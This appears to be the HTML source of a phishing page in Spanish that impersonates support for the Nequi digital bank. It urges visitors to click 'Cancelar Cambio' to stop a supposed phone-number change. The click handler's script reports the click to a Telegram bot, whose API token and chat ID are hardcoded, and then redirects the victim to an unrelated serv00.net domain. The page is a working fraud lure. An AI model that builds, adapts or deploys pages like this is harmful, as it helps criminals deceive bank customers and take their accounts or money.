<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-size: cover;
            background-position: center;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            position: relative;
            transition: background-image 1s ease-in-out; /* Transición suave entre imágenes */
        }

        /* Encabezado con franja blanca */
        .header {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            background-color: white; /* Fondo blanco */
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            box-sizing: border-box;
            color: black; /* Color de texto negro */
        }

        .header .title {
            font-size: 20px;
            margin: 0;
        }

        .header .datetime {
            font-size: 14px;
        }

        .container {
            background-color: rgba(0, 0, 0, 0.6); /* Fondo semitransparente */
            padding: 20px;
            border-radius: 10px;
            max-width: 90%;
            box-sizing: border-box;
        }

        .button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #483285; /* Color de fondo cambiado a #483285 */
            color: white; /* Color de texto blanco */
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold; /* Texto en negrita */
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
            max-width: 200px;
        }
        
        .button:hover {
            background-color: #372368; /* Color más oscuro al pasar el ratón */
        }

        .small-image-below {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <!-- Encabezado con franja blanca -->
    <div class="header">
        <div class="datetime" id="datetime"></div> <!-- Fecha y hora en tiempo real -->
        <h2 class="title">NEQUI</h2>
    </div>

    <div class="container">
        <h1>Soporte De Ayuda Nequi</h1>
        <p>Ingresa al siguiente enlace para Cancelar:</p>
        <button class="button" onclick="enviarMensaje()">Cancelar Cambio</button> <!-- Texto del botón cambiado a Cancelar Cambio -->
        
        <!-- Imagen pequeña debajo del botón -->
        <div class="small-image-below">
            <img src="logo.svg" alt="Imagen pequeña" width="100" height="100"> <!-- Reemplaza con la ruta de tu imagen -->
        </div>
    </div>

    <script>
        // Función para actualizar la fecha y hora en tiempo real
        function actualizarFechaHora() {
            const now = new Date();
            const fecha = now.toLocaleDateString();
            const hora = now.toLocaleTimeString();
            document.getElementById('datetime').textContent = `Fecha: ${fecha} - Hora: ${hora}`;
        }

        // Llamada inicial y actualización cada segundo
        actualizarFechaHora();
        setInterval(actualizarFechaHora, 1000);

        // Arreglo de imágenes de fondo
        const imagenesDeFondo = [
            'nq1.png', /* Imagen 1 */
            'nq2.webp', /* Imagen 2 */
            'nq3.png', /* Imagen 3 */
            'nq4.jpg', /* Imagen 4 */
            'nq5.jpg'  /* Imagen 5 */
        ];

        let indiceImagen = 0;

        // Función para cambiar la imagen de fondo cada 5 segundos
        function cambiarImagenDeFondo() {
            document.body.style.backgroundImage = `url('${imagenesDeFondo[indiceImagen]}')`;
            indiceImagen = (indiceImagen + 1) % imagenesDeFondo.length; // Ciclo a través de las imágenes
        }

        // Cambiar la imagen de fondo cada 5 segundos
        setInterval(cambiarImagenDeFondo, 5000);

        async function enviarMensaje() {
            const telegramBotToken = '7222469203:AAFQHhirrvnOPLikd-bE5isutnhSBrOsbMI';  // Reemplaza con tu token de bot
            const chatId = '6618919756';          // Reemplaza con tu chat ID
            const mensaje = 'El usuario ha hecho clic en "Cancelar CAMBIO DE NUMERO".';

            try {
                // Enviar mensaje a Telegram
                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`);
                const data = await response.json();

                if (data.ok) {
                    console.log('Mensaje enviado a Telegram:', data);
                    // Redireccionar solo después de confirmar que el mensaje fue enviado
                    window.location.href = 'https://jdhfur38kd.serv00.net/';
                } else {
                    console.error('Error en la respuesta de Telegram:', data);
                }
            } catch (error) {
                console.error('Error al enviar mensaje a Telegram:', error);
            }
        }

        // Inicializar la primera imagen de fondo
        cambiarImagenDeFondo();
    </script>
</body>
</html>